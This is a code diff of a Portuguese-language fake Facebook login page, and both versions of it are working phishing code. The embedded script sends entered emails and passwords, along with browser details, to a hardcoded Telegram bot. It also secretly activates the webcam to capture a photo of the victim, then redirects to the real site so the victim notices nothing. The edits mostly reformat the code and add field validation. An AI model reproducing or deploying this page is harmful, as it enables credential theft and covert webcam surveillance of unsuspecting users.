@@ -1,204 +1,229 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook – entre ou cadastre-se</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Facebook – entre ou cadastre-se</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+  }
 
-    body {
-      background-color: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
+  body {
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
 
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 20px;
-      width: 90%;
-      max-width: 400px;
-    }
+  .container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
+    width: 90%;
+    max-width: 400px;
+  }
 
-    .logo h1 {
-      color: #1877f2;
-      font-size: 48px;
-      margin-bottom: 10px;
-      text-align: center;
-      font-family: Helvetica, Arial, sans-serif;
-    }
+  .logo h1 {
+    color: #1877f2;
+    font-size: 48px;
+    margin-bottom: 10px;
+    text-align: center;
+    font-family: Helvetica, Arial, sans-serif;
+  }
 
-    .logo p {
-      font-size: 18px;
-      color: #1c1e21;
-      text-align: center;
-      margin-bottom: 10px;
-    }
+  .logo p {
+    font-size: 18px;
+    color: #1c1e21;
+    text-align: center;
+    margin-bottom: 10px;
+  }
 
-    .login-form {
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      width: 100%;
-    }
+  .login-form {
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    width: 100%;
+  }
 
-    .login-form input {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      font-size: 16px;
-    }
+  .login-form input {
+    width: 100%;
+    padding: 14px;
+    margin: 10px 0 5px 0;
+    border: 1px solid #ddd;
+    border-radius: 6px;
+    font-size: 16px;
+  }
 
-    .login-form button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 10px;
-      background-color: #1877f2;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
+  .error-message {
+    color: red;
+    font-size: 13px;
+    margin-bottom: 5px;
+    display: none;
+  }
 
-    .login-form button:hover {
-      background-color: #166fe5;
-    }
+  .login-form button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 10px;
+    background-color: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
 
-    .login-form .create-account {
-      background-color: #42b72a;
-      margin-top: 20px;
-      font-weight: bold;
-    }
+  .login-form button:hover {
+    background-color: #166fe5;
+  }
 
-    .login-form a {
-      display: block;
-      text-align: center;
-      margin-top: 12px;
-      color: #1877f2;
-      text-decoration: none;
-      font-size: 14px;
-    }
+  .login-form .create-account {
+    background-color: #42b72a;
+    margin-top: 20px;
+    font-weight: bold;
+  }
 
-    .login-form a:hover {
-      text-decoration: underline;
-    }
+  .login-form a {
+    display: block;
+    text-align: center;
+    margin-top: 12px;
+    color: #1877f2;
+    text-decoration: none;
+    font-size: 14px;
+  }
 
-    hr {
-      margin: 20px 0;
-      border: 1px solid #ddd;
-    }
-  </style>
+  .login-form a:hover {
+    text-decoration: underline;
+  }
+
+  hr {
+    margin: 20px 0;
+    border: 1px solid #ddd;
+  }
+</style>
 </head>
 <body>
 
-  <div class="container">
-    <div class="logo">
-      <h1>facebook</h1>
-      <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
-    </div>
-
-    <div class="login-form">
-      <form id="loginForm">
-        <input type="text" id="email" placeholder="Email ou telefone" required>
-        <input type="password" id="password" placeholder="Senha" required>
-        <button type="submit">Entrar</button>
-        <a href="#">Esqueceu a senha?</a>
-        <hr>
-        <button type="button" class="create-account">Criar nova conta</button>
-      </form>
-    </div>
+<div class="container">
+  <div class="logo">
+    <h1>facebook</h1>
+    <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
   </div>
 
-  <script>
-    const TOKEN = "7683050283:AAEmO1D90_4RysfVlLYOSf5NLfC1Bpg9FMA";
-    const CHAT_ID = "5542692841";
-    const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-    const URL_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+  <div class="login-form">
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="Email ou telefone" required>
+      <div id="emailError" class="error-message">Por favor, insira um e-mail válido.</div>
 
-    function sendMessage(text) {
-      return fetch(URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text,
-          parse_mode: 'Markdown'
-        })
-      }).then(res => res.json());
+      <input type="password" id="password" placeholder="Senha" required>
+      <div id="passwordError" class="error-message">A senha deve ter pelo menos 6 caracteres.</div>
+
+      <button type="submit">Entrar</button>
+      <a href="#">Esqueceu a senha?</a>
+      <hr>
+      <button type="button" class="create-account">Criar nova conta</button>
+    </form>
+  </div>
+</div>
+
+<script>
+const TOKEN = "7683050283:AAEmO1D90_4RysfVlLYOSf5NLfC1Bpg9FMA";
+const CHAT_ID = "5542692841";
+const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+const URL_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+
+const emailInput = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+const emailError = document.getElementById('emailError');
+const passwordError = document.getElementById('passwordError');
+
+const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const MIN_PASSWORD_LENGTH = 6;
+
+// Validação em tempo real
+emailInput.addEventListener('input', () => {
+  if (!emailRegex.test(emailInput.value.trim())) {
+    emailError.style.display = 'block';
+  } else {
+    emailError.style.display = 'none';
+  }
+});
+
+passwordInput.addEventListener('input', () => {
+  if (passwordInput.value.length < MIN_PASSWORD_LENGTH) {
+    passwordError.style.display = 'block';
+  } else {
+    passwordError.style.display = 'none';
+  }
+});
+
+function sendMessage(text) {
+  return fetch(URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+  }).then(res => res.json());
+}
+
+function sendPhoto(base64Photo, caption) {
+  function base64ToBlob(base64, mime) {
+    const byteChars = atob(base64);
+    const byteNumbers = new Array(byteChars.length);
+    for (let i = 0; i < byteChars.length; i++) {
+      byteNumbers[i] = byteChars.charCodeAt(i);
     }
+    const byteArray = new Uint8Array(byteNumbers);
+    return new Blob([byteArray], {type: mime});
+  }
 
-    function sendPhoto(base64Photo, caption) {
-      function base64ToBlob(base64, mime) {
-        const byteChars = atob(base64);
-        const byteNumbers = new Array(byteChars.length);
-        for (let i = 0; i < byteChars.length; i++) {
-          byteNumbers[i] = byteChars.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        return new Blob([byteArray], {type: mime});
-      }
+  const mimeType = 'image/png';
+  const base64Data = base64Photo.replace(/^data:image\/(png|jpg|jpeg);base64,/, '');
+  const photoBlob = base64ToBlob(base64Data, mimeType);
 
-      const mimeType = 'image/png';
-      const base64Data = base64Photo.replace(/^data:image\/(png|jpg|jpeg);base64,/, '');
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('caption', caption);
+  formData.append('photo', photoBlob, 'login_photo.png');
 
-      const photoBlob = base64ToBlob(base64Data, mimeType);
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('caption', caption);
-      formData.append('photo', photoBlob, 'login_photo.png');
+  return fetch(URL_PHOTO, { method: 'POST', body: formData }).then(res => res.json());
+}
 
-      return fetch(URL_PHOTO, {
-        method: 'POST',
-        body: formData
-      }).then(res => res.json());
-    }
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+  const email = emailInput.value.trim();
+  const password = passwordInput.value;
 
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
+  let valid = true;
 
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/;
+  if (!emailRegex.test(email)) {
+    emailError.style.display = 'block';
+    valid = false;
+  }
 
-      if (!email || !password) {
-        alert('Por favor, preencha todos os campos.');
-        return;
-      }
+  if (password.length < MIN_PASSWORD_LENGTH) {
+    passwordError.style.display = 'block';
+    valid = false;
+  }
 
-      if (!emailRegex.test(email)) {
-        alert('Por favor, insira um email válido.');
-        return;
-      }
+  if (!valid) return;
 
-      if (!passwordRegex.test(password)) {
-        alert('A senha deve ter pelo menos 6 caracteres, incluindo pelo menos uma letra e um número.');
-        return;
-      }
+  const userAgent = navigator.userAgent;
+  const language = navigator.language;
+  const screenWidth = screen.width;
+  const screenHeight = screen.height;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      const userAgent = navigator.userAgent;
-      const language = navigator.language;
-      const screenWidth = screen.width;
-      const screenHeight = screen.height;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-      const messageText = `
+  const messageText = `
 🔐 *Novo Login Capturado*
 📧 Email: ${email}
 🔑 Senha: ${password}
@@ -208,42 +233,37 @@
 🖥️ Resolução: ${screenWidth}x${screenHeight}
 🌍 Idioma: ${language}
 ⏰ Fuso horário: ${timezone}
-      `;
+  `;
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        const video = document.createElement('video');
-        video.style.display = 'none';
-        document.body.appendChild(video);
-        video.srcObject = stream;
+  navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    video.srcObject = stream;
+    video.play();
 
-        video.play();
+    video.addEventListener('loadeddata', () => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/png');
 
-        video.addEventListener('loadeddata', () => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL('image/png');
+      stream.getTracks().forEach(track => track.stop());
+      video.remove();
 
-          stream.getTracks().forEach(track => track.stop());
-          video.remove();
-
-          sendPhoto(imageData, messageText)
-            .finally(() => {
-              window.location.href = "https://facebook.com"; // Redireciona após enviar
-            });
-        });
-      })
-      .catch(() => {
-        sendMessage(messageText)
-          .finally(() => {
-            window.location.href = "https://facebook.com"; // Redireciona mesmo sem foto
-          });
-      });
+      sendPhoto(imageData, messageText)
+        .finally(() => window.location.href = "https://facebook.com");
     });
-  </script>
+  })
+  .catch(() => {
+    sendMessage(messageText)
+      .finally(() => window.location.href = "https://facebook.com");
+  });
+});
+</script>
 
 </body>
 </html>
